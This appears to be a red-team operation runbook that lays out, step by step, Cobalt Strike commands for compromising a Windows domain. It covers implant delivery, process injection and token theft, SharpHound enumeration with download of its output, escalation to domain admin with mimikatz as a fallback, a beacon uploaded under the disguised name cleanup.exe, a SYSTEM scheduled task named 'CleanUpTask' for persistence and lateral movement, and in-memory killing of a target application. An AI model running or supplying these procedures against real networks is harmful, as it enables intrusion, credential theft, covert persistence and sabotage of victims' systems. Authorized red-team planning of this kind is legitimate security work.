### Objective 0: Gain interactive-access to target system to conduct operations
***MOE - Successful callback to team server received.***

- **Task 0.1 - Generate and provide implant to trusted agent.**

    ***MOP - Functioning beacon created and delivered.***
- **Task 0.2 - Perform situational awareness checks.**
    - [Perform Situational Awareness Checks](https://belfry.cave.lan/Library/TTPs/Enumeration/Host/Procedure%20-%20Perform%20Situational%20Awareness%20-%20Cohabitation%20Using%20Cobalt%20Strike.html)

    ***MOP - All commands ran and logged appropriately.***
#### Artifacts
|Artifact|Description|
|-|-|
|`s2_beacon.exe`|initial beacon|
---
---
### Objective 1: Identify target host
***MOE - Target host and credentials identified to perform lateral movement.***
- **Task 1.1: Gain necessary context to perform enumeration**
    - Inject into running adm process or steal token
        ```
        inject <pid> x64 HTTP
        ```
        - Domain admin context may be obtained here if present on host
    
    ***MOP - New beacon callback or context changed***
- **Task 1.2: Enumerate domain with approved tools**
    - Bloodhound
        - Navigate to discrete directory on host
        ```
        cd C:\Users\<username>\AppData\Local\Microsoft
        ```
        - Execute sharphound
        ```
        inlineExecute-Assembly --dotnetassembly <path_to>/SharpHound.exe
        ```
        - Exfil sharphound data
        ```
        download C:\Users\<username>\AppData\Local\Microsoft\<sharphoundname>.zip
        ```
    ***MOP - Necessary information gathered, ingested and path to target identified.***

#### Artifacts
|Artifact|Description|
|-|-|
|`xxx_sharphound.zip`|Sharphound output|
|`<xxx>.bin`|Sharphound output|

---


---
### Objective 2: Escalate network privileges within the domain
***MOE - Accesses capable of performing operations on remote domain target.***
- **Task 2.1: Gain domain admin context/privilege if not already obtained during enumeration**
    ```
    steal_token <pid>
    ```
    ***MOP - User context changed to admin level.***

**Contingency**: If no domain admin processes present attempt to discover cached credentials. (mimikatz, plain text passwords, etc)

---
---
### Objective 3: Establish persistent access to target host
***MOE - Access to target host can be reestablished if lost due to reboot or killed beacon process.***
- **Task 4.1: Upload beacon to target host**
    ```
    upload_rename <path_to>/s2_beacon.exe <UNC PATH>\C$\Users\Public\Downloads\s2_beacon.exe cleanup.exe
    ```
    - *Validation*
        ```
        dir <UNC PATH>\C$\Users\Public\Downloads\
        ```
    ***MOP - Validation of beacon on target.***
- **Task 4.2: Create scheduled task to execute beacon on box**
    ```
    shell schtasks /create /S <FQDN> /SC Weekly /RU "NT Authority\System" /TN "CleanUpTask" /TR "powershell.exe -c "C\Users\Public\Downloads\cleanup.exe"
    ```
    - *Validation*
        ```
        shell schtasks /query /S <FQDN> /TN "CleanUpTask"
        ```
    ***MOP - Validation of scheduled task.***
#### Artifacts
|Artifact|Description|
|-|-|
|`CleanUpTask`|Scheduled task|

### Objective 4: Move to target host
***MOE - Interactive access on target host.***
- **Task 4.1: Remotely execute scheduled task**
    ```
    shell schtasks /Run /S <FQDN> /TN "CleanUpTask"
    ```
    ***MOP - Beacon callback received from target host.***
---
---
### Objective 5: Deny usage of `Important_Software.exe` without manipulating the executable on disk.
***MOE - `Important_Software.exe` has been denied from executing exactly 5 times.***
- **Task 5.1: Locate `Important_Software.exe`**
    - Utilize powershell to locate `Important_Software.exe` or other approved method (dir walk).
        ```powershell
        powershell Get-Childitem -Recurse -Path C:\ | Where-Object {$_.Name -cmatch "[Ii]mportant"}
        ```

    ***MOP - `Important_Software.exe` existence and location has been verified.***
- **Task 5.2: Prepare `process_kill.ps1` and execute in beacon memory**
    - Modify `process_kill.ps1` with the correct process name.
        ```powershell
            $targetProcess = "<target>.exe" # modify this value
        ```
    - Import `process_kill.ps1` into Cobalt Strike
        ```
        powershell-import <path_to>/process_kill.ps1
        ```
    - Execute `process_kill.ps1` function `DoUpdate`
        ```
        powershell DoUpdate
        ```

    ***MOP - `Important_Software.exe` process is killed and not allowed to run properly.***
#### Artifacts
|Artifact|Description|
|-|-|
|`C:\Users\Public\Downloads\cleanup.exe`|beacon|